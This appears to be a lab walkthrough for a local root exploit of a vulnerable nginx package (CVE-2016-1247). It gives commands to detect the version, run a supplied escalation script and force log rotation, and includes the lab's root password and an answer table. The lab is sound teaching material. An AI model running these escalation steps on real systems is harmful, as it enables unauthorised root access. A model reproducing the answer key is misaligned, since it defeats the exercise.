**Detection**

Linux VM

1. In command prompt type: 
   
```
dpkg -l | grep nginx
```

2. From the output, notice that the installed nginx version is below 1.6.2-5+deb8u3.

**Exploitation**

Linux VM – Terminal 1

1. For this exploit, it is required that the user be www-data. To simulate this escalate to root by typing: **su root**

2. The root password is 
   
```
password123
```

3. Once escalated to root, in command prompt type: 
   
```
su -l www-data
```

4. In command prompt type: 

```
/home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log
```

5. At this stage, the system waits for logrotate to execute. In order to speed up the process, this will be simulated by connecting to the Linux VM via a different terminal.

Linux VM – Terminal 2

1. Once logged in, type: 
   
```
su root
```

2. The root password is 
   
```
password123
```

3. As root, type the following: 
   
```
invoke-rc.d nginx rotate >/dev/null 2>&1
```

4. Switch back to the previous terminal.

![[Pasted image 20240601221753.png]]


Linux VM – Terminal 1

1. From the output, notice that the exploit continued its execution.

2. In command prompt type: 
   
```
id
```

![[Pasted image 20240601221835.png]]


Answer the questions below

| Question                                               | Answer        |
| ------------------------------------------------------ | ------------- |
| What CVE is being exploited in this task?              | CVE-2016-1247 |
| What binary is SUID enabled and assists in the attack? | sudo          |
